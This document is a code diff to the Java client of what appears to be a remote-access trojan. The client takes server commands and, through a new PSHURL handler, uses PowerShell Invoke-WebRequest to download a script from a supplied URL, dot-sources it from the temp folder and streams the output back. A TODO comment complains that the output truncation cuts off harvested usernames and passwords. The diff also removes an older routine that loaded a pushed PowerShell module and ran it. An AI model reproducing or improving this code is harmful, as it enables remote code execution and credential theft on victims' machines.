@@ -248,24 +248,34 @@ public class Client {
                     f.deleteOnExit();
                     socket.close();
                     System.exit(0);
-                } else if (input.contains("PSHMOD")) {
+                } else if (input.contains("PSHURL")) {
                     /*
-                    Server: PSHMOD len funcName
-                    Server: while bytes != -1 then send(byte[n])
-
+                    Server: PSHURL url
+                    Client: PSHURL
+                    Client: output[0]\n
+                    Client: output[1]\n
+                    ...
+                    Client: ENDPSH
                      */
-                    communicate("PSHMOD");
-                    long len = Long.parseLong(input.split(" ")[1]);
-                    // Write ps1 to disk here TODO change addPshModuleAndExecute to not write to disk again
-                    File out = new File(".\\" + randTextAlphaRestricted(8) + ".ps1"); // TODO write to tmpdir or appdata
-                    FileOutputStream fos = new FileOutputStream(out);
-                    BufferedOutputStream bos = new BufferedOutputStream(fos);
-                    for (int j = 0; j < len; j++) bos.write(dis.readInt());
-                    bos.close();
-                    fos.close();
-                    // PS1 is written, send it over to addPshModuleAndExecute
+                    communicate("PSHURL");
+                    String url = input.split(" ")[1];
+                    String fname = randTextAlphaRestricted(8) + ".ps1";
+                    String cmd = "powershell.exe \"Invoke-WebRequest " + url + " -OutFile " + System.getProperty("java.io.tmpdir") + fname + "; . " + System.getProperty("java.io.tmpdir") + fname + ";\"";
+                    System.out.println("Command: " + cmd);
+                    // Run the command
+                    // TODO: fix bug below
+                    // For some reason, the lines are being truncated at around 117-120 char mark, completely cutting off most usernames and passwords
 
-                    communicate(addPshModuleAndExecute(out.getAbsolutePath(), input.split(" ")[2])); // Should change to addPshModuleAndExecute(String fPath, String funcName)
+                    ProcessBuilder builder = new ProcessBuilder(cmd.split(" "));
+                    builder.redirectErrorStream(true);
+                    Process proc = builder.start();
+                    BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+                    String s = null;
+                    while ((s = stdInput.readLine()) != null){
+                        communicate(s);
+                        System.out.println("Got line: " + s);
+                    }
+                    communicate("ENDPSH");
                 } else if (input.contains("DAE")){
                     communicate("DAE");
                     String url = input.split(" ")[1];
@@ -556,32 +566,7 @@ public class Client {
         execNoComm(cmd);
     }
 
-    // fPath: absolute path to script file :: :: :: funcName: the name of the function to execute
-    private String addPshModuleAndExecute(String fPath, String funcName){
-        File scriptOut = new File(fPath);
-        // Imports the module, executes it, deletes file, removes module import
-        String cmd = "powershell.exe \"Import-Module " + scriptOut.getAbsolutePath() + " -Force; " + funcName + ";\"";
-        try {
-            // Execute command and get output
-            Process p = Runtime.getRuntime().exec(cmd);
-            p.waitFor();
-            BufferedReader buf = new BufferedReader(new InputStreamReader(p.getInputStream()));
-            String line;
-            String output = "";
-            while ((line = buf.readLine()) != null){
-                output += line + "\n";
-            }
-            // When its done reading, delete the file
-            scriptOut.delete();
-            return output;
-
-        } catch (IOException | InterruptedException e){
-            return "Could not write function to file: " + e.getMessage();
-        }
-    }
-
     /// Util functions \\\
-
     public String randTextAlpha(int length){
         int leftLimit = 65; // letter 'A'
         int rightLimit = 122; // letter 'z'
